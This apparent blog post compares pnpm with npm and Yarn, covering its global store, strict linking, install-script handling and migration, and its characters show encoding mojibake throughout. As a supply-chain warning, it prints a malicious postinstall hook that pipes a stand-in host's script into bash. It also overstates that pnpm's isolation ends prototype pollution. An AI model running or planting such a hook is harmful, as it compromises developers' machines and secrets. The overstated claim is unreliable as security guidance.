---
title: "PNPM â€“ When Devs No Longer Wait for NPM to â€œRun Errandsâ€"
description: "A no‑nonsense guide to PNPM vs NPM/Yarn: how the store works, why installs are faster and disks stay lean, and what to watch for when switching."
pubDate: "2025-10-29"
published: true
tags: ["pnpm", "npm", "tooling", "package manager"]
slug: "pnpm-when-devs-stop-waiting-for-npm"
author: "Hien Nguyen"
ogTitle: "PNPM â€“ When Devs No Longer Wait for NPM to Run Errands"
ogDescription: "PNPM vs NPM/Yarn in practice: the store model, real speed gains, lean disks, and the trade‑offs when you switch."
pairSlug:
  vi: "pnpm-khi-dev-khong-can-cho-npm-di-cho-giup-minh-nua"
---

# âš¡ PNPM â€“ When Devs No Longer Wait for NPM to â€œRun Errandsâ€

> â€œnpm installâ€ cranks your fans and nukes your disk? Time to give **pnpm** a spin.

---

## ðŸ§© The Familiar Story

You clone a repo and run:

```bash
npm install
```

And thenâ€¦ you wait.  
And wait.  
And keep waiting.

Maybe you try **Yarn**â€”a bit betterâ€”but it still downloads the same package ten times for ten different projects.  
`node_modules` bloats into gigabytes, disks fill up, and CI crawls like a sleepy turtle.

That was the scene before **pnpm** showed up.

---

## ðŸš€ How PNPM Differs from NPM and Yarn

In short: **pnpm stores dependencies completely differently.**

| Mechanism       | NPM / Yarn                              | PNPM                                                                      |
| --------------- | --------------------------------------- | ------------------------------------------------------------------------- |
| Storage         | Copies every package per project        | Uses a **global content-addressable store**; projects just **symlink** in |
| Disk Usage      | Heavy, lots of duplication               | Very light; saves tons of space                                           |
| Install Speed   | Average                                  | **2â€“3Ã— faster** (cache + hard links)                                      |
| Version Control | Managed per project                      | Laser-accurate thanks to **strict symlink resolution**                    |
| Script Security | **Automatically runs `postinstall`**     | **Doesnâ€™t run scripts unless you opt in**                                 |

---

## ðŸ”’ Security â€” PNPMâ€™s Underrated Superpower

This is the piece many devs overlookâ€”but itâ€™s huge.

### âŒ The Problem with NPM/Yarn

When you run `npm install` or `yarn install`,  
packages can **auto-run scripts** like:

```json
"scripts": {
  "postinstall": "curl malicious-site.com | bash"
}
```

If youâ€™re not auditing closelyâ€”or your CI isnâ€™t sandboxedâ€”that code just executed on your machine. Supply-chain attacks like this are everywhere: pull a Node.js repo (maybe for a coding test), run `npm i`, and boomâ€”malware fires, scraping env vars for API keys, GitHub tokens, AWS creds. In September 2025 several popular packages such as `chalk` and `debug` were compromised, cascading into hundreds of dependents; the â€œShai-Huludâ€ worm replicated across millions of installs, leaking secrets simply because install scripts auto-ran. This is a **classic attack vector**, especially dangerous for juniors or teams that donâ€™t audit dependencies.

### âœ… PNPM Handles It Smarter

- **No script runs by default**â€”you have to explicitly allow it.
- You can set `--ignore-scripts` globally in `.npmrc`:
  ```bash
  pnpm install --ignore-scripts
  ```
- Keeps **third-party payloads dormant**â€”grab a random repo, run `pnpm i`, and malicious scripts stay asleep instead of stealing keys or spreading.
- PNPM also sandboxes `node_modules`, preventing **module A from overriding module B**â€”attacks such as _prototype pollution_ or _dependency shadowing_ basically disappear.

> ðŸ§  Translation: pnpm installs packages without blindly trusting themâ€”exactly what you want after the latest supply-chain incidents.

---

## ðŸ§  A Different Design Mindset

### 1ï¸âƒ£ â€œGlobal Storeâ€ â€” Smart Disk Usage

PNPM keeps dependencies in a single global store (by default: `~/.pnpm-store`).  
Each package exists **once**â€”projects just link to it.

```bash
# First project
pnpm install

# Another project later
pnpm install   # Almost instant; packages already cached
```

### 2ï¸âƒ£ â€œStrict Linkingâ€ â€” No Loose Dependencies

PNPM builds `node_modules` via a custom â€œvirtual store.â€  
Dependencies can only reach modules declared in `package.json`.

Benefits:

- No more â€œhidden dependencyâ€ bugs (importing something you never declared).
- Builds are reproducibleâ€”CI wonâ€™t fail because someoneâ€™s laptop leaked globals.

---

## ðŸ§° Quick Migration

Already on NPM or Yarn?

```bash
npm install -g pnpm
# Or on Node 18+ with corepack
corepack enable pnpm
```

Switch your scripts:

```bash
pnpm install
pnpm run dev
```

Everything elseâ€”scripts, toolingâ€”keeps working.  
Youâ€™ll feel the speed boost on the first run.

---

## âš–ï¸ When Not to Switch (Yet)

- Teams running **Yarn 1 workspaces + heavy custom plugins**â€”test carefully.
- Legacy CI/CD stacks without pnpm cache support.
- A few tools (rare) still assume classic `node_modules` structure.

That said, with **Node 18+ and corepack**, pnpm is now silky smooth.  
Vercel, Turborepo, Nx, Cloudflare Workersâ€”they all support it out of the box.

---

## ðŸ’¬ TL;DR

|                 | NPM               | Yarn        | PNPM                                   |
| --------------- | ----------------- | ----------- | -------------------------------------- |
| Speed           | ðŸ¢                | âš¡          | ðŸš€                                     |
| Disk Usage      | Heavy             | Medium      | Very light                             |
| Script Safety   | Auto-runs scripts | Auto-runs   | **Doesnâ€™t run unless you allow it**    |
| Global Cache    | âŒ                | âœ… (partial) | âœ… (full)                               |
| Isolation       | Low               | Medium      | **High (symlink isolation)**           |
| Best For        | Any small/legacy  | Mid-size    | **Pro teams / modern CI pipelines**    |

---

## ðŸ”— Official Resources

- [pnpm.io](https://pnpm.io)
- [PNPM store structure](https://pnpm.io/symlinked-node-modules-structure)
- [Corepack & pnpm setup](https://nodejs.org/api/corepack.html)

---

âœï¸ _Written by a dev whose `node_modules` used to outweigh the source code.  
With pnpm the disk stays slim, builds fly, and CI stays calm._


